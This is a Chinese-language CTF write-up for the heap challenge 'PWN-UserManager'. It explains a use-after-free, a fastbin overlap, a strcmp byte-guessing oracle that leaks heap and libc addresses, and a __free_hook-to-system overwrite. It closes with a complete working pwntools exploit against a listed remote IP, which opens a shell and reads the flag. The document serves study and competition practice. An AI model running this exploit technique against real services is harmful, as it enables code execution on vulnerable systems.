# PWN-UserManager 赛后复盘

## 题目信息

- 题目名：`PWN-UserManager`
- 类型：`PWN`
- 难度：初级
- 关键考点：`UAF`、`fastbin`、`strcmp` 字节 oracle、堆地址泄露、`unsorted bin` 泄露 libc、`__free_hook` 劫持

## 一句话总结

这题的核心不是“直接伪造函数指针打 system”，而是先利用 `Delete` 后未清空指针造成的 `UAF`，再借助 `0x18` 大小的 fastbin 精确重叠用户结构体，之后把 `strcmp` 当成逐字节匹配 oracle 来泄露堆地址，接着通过 `unsorted bin` 泄露 `main_arena`，最后覆盖 `__free_hook = system`，`free("/bin/sh")` 出 shell。

## 程序逻辑

程序维护一个 `users[10]` 数组，每个元素指向一个用户结构体。

用户结构体可以抽象成：

```c
struct user {
    char *data;          // 密码缓冲区指针
    void (*p)(char *);   // 函数指针，初始为 show
    size_t size;         // 密码长度
};
```

结构体大小是 `0x18`，在 glibc 2.23 下对应的 chunk 大小是 `0x20`，属于 fastbin。

四个菜单功能：

1. `Register`
2. `Login`
3. `Delete`
4. `Edit`

## 漏洞点

漏洞在 `Delete()`：

```c
free(users[id]->data);
free(users[id]);
// users[id] 没有置空
```

也就是说：

- 密码 chunk 被 free
- 用户结构体 chunk 被 free
- 但是 `users[id]` 这个指针还留着

后面如果再执行：

- `Edit(id)`：会往已经释放的 `users[id]->data` 里写数据
- `Login(id)`：会继续拿这个悬垂结构体做 `strcmp` 和函数调用

这就是标准的 `Use-After-Free`。

## 为什么关键大小是 0x18

一开始最容易想到的是随便申请两个同大小 chunk 然后重叠，但这题最精妙的点在于：

- `user` 结构体本身是 `malloc(0x18)`
- 如果我们注册一个密码长度也为 `0x18` 的用户，那么密码块同样是 `malloc(0x18)`

于是，`Delete(0)` 以后被释放的其实是两个 **同一个 fastbin size** 的 chunk：

1. `users[0]->data`
2. `users[0]`

这样在后续再次 `Register(..., 0x18, ...)` 时，就可以把新申请的密码块和旧的用户结构体精确重叠。

这比“覆盖 chunk header 再偏移 0x10”那种打法更直接，也更适合做后续泄露。

## 核心利用思路

### 第一步：制造 UAF

先创建一个用户 `0`：

```python
reg(0, 0x18, b"A")
delete(0)
```

执行完后：

- `user0->data` 被 free
- `user0` 结构体被 free
- `users[0]` 仍然指向旧结构体地址

这时 `users[0]` 就成了悬垂指针。

### 第二步：重新申请 0x18，精确重叠旧结构体

再创建一个用户 `1`：

```python
reg(1, 0x18, b"\x10")
```

这里不是随便传一个密码，而是故意用一个很短的密码，比如 `b"\x10"`。

为什么？

因为新的 `Register(1, 0x18, ...)` 会做两次 `malloc`：

1. `malloc(0x18)` 给密码块
2. `malloc(0x18)` 给新的 `user1` 结构体

由于 fastbin 是 LIFO，这两次分配会把刚才释放的两个 `0x20` chunk 重新拿回来。

这样就形成了：

- 新用户的一部分数据，和旧用户 `users[0]` 指向的结构体重叠
- 后面可以通过 `edit(1, ...)` 改写 `user0` 结构体字段

这就是整题最关键的重叠原语。

## 为什么要用 strcmp 做 oracle

`Login()` 的关键逻辑是：

```c
read(0, pass, len);
if (!strcmp(pass, users[id]->data)) {
    puts("Login success!");
    users[id]->p(users[id]->data);
}
```

这里 `strcmp` 的价值非常大：

- 它会逐字节比较
- 一旦前缀匹配成功，就继续比较下一字节
- 如果全部匹配到 `\x00` 为止，就会进入 `Login success!`

于是我们可以把它当成一个 **字节匹配 oracle**：

- 只要我们能把 `users[0]->data` 指到某个目标地址
- 然后一字节一字节猜该地址上的内容
- 看返回是 `Wrong password!` 还是 `Login success!`

就可以把目标地址上的字节慢慢爆出来。

这比单纯依赖 `puts` 的 overread 稳定得多。

## 堆地址泄露是怎么做的

作者 WP 里这部分是整题真正的灵魂。

### 思路

先把 `users[0]->data` 改成指向某个我们怀疑是堆上结构体的位置，然后让 `strcmp` 帮我们一字节一字节猜。

具体来说：

```python
def set_user0_pass_low(r, low):
    edit(r, 1, bytes([low]))
```

这里通过 `edit(1, ...)` 只改一个低字节，把 `users[0]->data` 在附近的小范围内滑动。

然后：

```python
def leak_heap_s0(r, p0_low=0x10, high_hint=0x55):
    ...
```

这个函数做的是：

1. 先假设目标地址高字节大概率是 `0x55`
   这是 Linux 用户态堆地址很常见的高字节特征
2. 从高字节往低字节爆破
3. 每次构造一个猜测串 `guess`
4. 调用 `login_try()`
5. 如果返回里有 `Login success!`，说明猜对了当前字节

最后得到：

- `S0`：某个堆上结构体指针
- `P0 = S0 - 0x20`

这里 `-0x20` 是因为 chunk 和结构体的相对位置在堆布局里是固定关系。

## libc 泄露为什么走 unsorted bin

光有堆地址还不够，我们还得拿 libc。

作者 WP 这里的做法是：

```python
reg(r, 2, 0x100, b"B")
delete(r, 2)
```

关键点在于：

- `0x100` 这个大小不再走 fastbin
- 被 free 以后会进入 `unsorted bin`
- `unsorted bin` chunk 的 `fd/bk` 会指向 `main_arena`

而 `main_arena` 在 libc 内部是固定偏移，所以只要能把这个指针泄露出来，就能算出 libc 基址。

具体代码：

```python
arena_leak = leak_ptr_backwards(r, L2, high_hint=0x7f)
libc_base = arena_leak - 0x3c4b78
```

这里：

- `L2` 是预测出来的 unsorted chunk 地址
- `0x7f` 作为高字节 hint，是因为 libc 地址高位通常是 `0x7f`
- `0x3c4b78` 是 glibc 2.23 中 `main_arena` 对应的固定偏移

于是 libc 就出来了。

## 为什么最后打 __free_hook

拿到 libc 基址以后，最自然的收尾方式就是：

```python
__free_hook = system
free("/bin/sh")
```

原因很简单：

- 题目本身就有现成的 `Delete()`
- `Delete()` 会调用 `free(users[id]->data)`
- 如果我们注册一个密码为 `"/bin/sh\x00"` 的用户
- 再删掉它
- 那么就等价于执行：

```c
system("/bin/sh")
```

这比覆盖 `__malloc_hook` 更顺手，因为程序本来就不断地暴露 `free` 原语。

作者贴出的最终版本也是这条链。

## 完整利用链梳理

按顺序整理就是：

1. `reg(0, 0x18, ...)`
2. `delete(0)`，制造悬垂指针
3. `reg(1, 0x18, b"\x10")`，通过同尺寸 fastbin 重新拿回旧结构体相关 chunk
4. 借助 `edit(1, ...)` 改写 `users[0]->data`
5. 用 `strcmp` oracle 逐字节泄露堆指针
6. 申请大块 `0x100`，释放后进 unsorted bin
7. 再用同样的 oracle 逐字节泄露 `main_arena`
8. 计算 libc 基址
9. 把 `__free_hook` 改成 `system`
10. 注册一个密码是 `"/bin/sh\x00"` 的用户
11. `delete()` 这个用户，触发 `system("/bin/sh")`
12. `cat flag`

## 这题和我之前那条思路的差别

赛后很值得记的一点是：这题虽然也能走“直接伪造函数指针调用 system”的路线，但那条路线更依赖：

- 具体堆布局
- 绝对地址猜测
- 远端服务是否关 ASLR

而这份 WP 用的是更标准也更稳定的做法：

- `0x18` 精确重叠
- `strcmp` 做地址泄露 oracle
- `unsorted bin` 泄露 libc
- `__free_hook` 收尾

这是更像出题人原意的完整解。

## 这份思路里最值得记住的 3 个点

### 1. 先看结构体大小，再选重叠尺寸

很多堆题里，“结构体本身的大小”和“用户可控数据块大小”如果能落到同一个 bin，往往就能做精确重叠。

这题的关键就是结构体正好是 `0x18`。

### 2. strcmp 不只是校验，还能当 oracle

看到：

```c
strcmp(user_input, ptr_on_heap)
```

一定要想到：

- 能不能逐字节猜？
- 能不能反过来当泄露工具？

这题真正的突破点就在这里。

### 3. 有 free 原语时，优先想 __free_hook

glibc 2.23 时代：

- `__free_hook`
- `__malloc_hook`

都很常见。

如果程序天然就给你一个稳定的 `free(ptr)`，那么 `__free_hook = system` 往往比别的收尾方式更顺手。

## 可参考 EXP

下面保留一份更接近原思路的完整 EXP，方便赛后对照：

```python
from pwn import *
import time

HOST, PORT = "120.27.146.76", 26966
BIN = r"C:\Users\ChenFu\Desktop\YWB\PWN\PWN-UserManager\login"
LIBC = r"C:\Users\ChenFu\Desktop\YWB\PWN\PWN-UserManager\libc-2.23.so"

elf = ELF(BIN)
libc = ELF(LIBC)
context.log_level = "info"

def connect():
    for _ in range(8):
        try:
            r = remote(HOST, PORT, timeout=10)
            r.recvuntil(b"Your choice:", timeout=10)
            return r
        except Exception:
            try:
                r.close()
            except Exception:
                pass
            time.sleep(10)
    raise RuntimeError("connect failed")

def reg(r, idx, size, data):
    r.sendline(b"2")
    r.recvuntil(b"Input the user id:")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Input the password length:")
    r.sendline(str(size).encode())
    r.recvuntil(b"Input password:")
    if data:
        r.send(data)
    r.recvuntil(b"Your choice:")

def delete(r, idx):
    r.sendline(b"3")
    r.recvuntil(b"Input the user id:")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Your choice:")

def edit(r, idx, data):
    r.sendline(b"4")
    r.recvuntil(b"Input the user id:")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Input new pass:")
    r.send(data)
    r.recvuntil(b"Your choice:")

def login_try(r, idx, data):
    r.sendline(b"1")
    r.recvuntil(b"Input the user id:")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Input the passwords length:")
    r.sendline(str(len(data)).encode())
    r.recvuntil(b"Input the password:")
    if data:
        r.send(data)
    out = r.recvuntil(b"Your choice:", timeout=5)
    return out

def set_user0_pass(r, addr):
    edit(r, 1, p64(addr))

def set_user0_pass_low(r, low):
    edit(r, 1, bytes([low]))

def leak_ptr_backwards(r, ptr_addr, high_hint=None):
    known = b""
    for off in range(5, -1, -1):
        set_user0_pass(r, ptr_addr + off)
        order = range(256)
        if high_hint is not None and off == 5:
            order = [high_hint] + [x for x in range(256) if x != high_hint]
        for b in order:
            guess = bytes([b]) + known
            out = login_try(r, 0, guess)
            if b"Wrong password!" not in out and b"Login success!" in out:
                known = guess
                log.info("leak @%#x byte[%d]=%#x -> %s", ptr_addr, off, b, known.hex())
                break
        else:
            raise RuntimeError(f"failed leaking {ptr_addr:#x} at byte {off}, known={known.hex()}")
    return u64(known.ljust(8, b"\x00"))

def leak_heap_s0(r, p0_low=0x10, high_hint=0x55):
    known = b""
    for off in range(5, -1, -1):
        set_user0_pass_low(r, p0_low + off)
        order = range(256)
        if off == 5:
            order = [high_hint, 0x56, 0x55, 0x57] + [x for x in range(256) if x not in (high_hint, 0x56, 0x55, 0x57)]
        for b in order:
            guess = bytes([b]) + known
            out = login_try(r, 0, guess)
            if b"Wrong password!" not in out and b"Login success!" in out:
                known = guess
                log.info("heap byte[%d]=%#x -> %s", off, b, known.hex())
                break
        else:
            raise RuntimeError(f"failed heap leak at byte {off}, known={known.hex()}")
    return u64(known.ljust(8, b"\x00"))

r = connect()

reg(r, 0, 0x18, b"A")
delete(r, 0)
reg(r, 1, 0x18, b"\x10")

S0 = leak_heap_s0(r, p0_low=0x10, high_hint=0x55)
P0 = S0 - 0x20
log.success("heap S0=%#x P0=%#x", S0, P0)

set_user0_pass(r, P0)
L2 = S0 + 0x20
reg(r, 2, 0x100, b"B")
delete(r, 2)
log.info("predicted unsorted chunk L2=%#x", L2)

arena_leak = leak_ptr_backwards(r, L2, high_hint=0x7f)
libc_base = arena_leak - 0x3c4b78
log.success("arena leak=%#x libc=%#x", arena_leak, libc_base)

free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
log.info("overwrite free_hook=%#x with system=%#x", free_hook, system)

set_user0_pass(r, free_hook)
edit(r, 0, p64(system))

reg(r, 3, 0x18, b"/bin/sh\x00")
delete(r, 3)
r.sendline(b"cat flag; cat /flag; cat /flag*")
r.interactive()
```

## Flag

```text
flag{5d2e01c99c338d6ab40a5c1f4c913219}
```
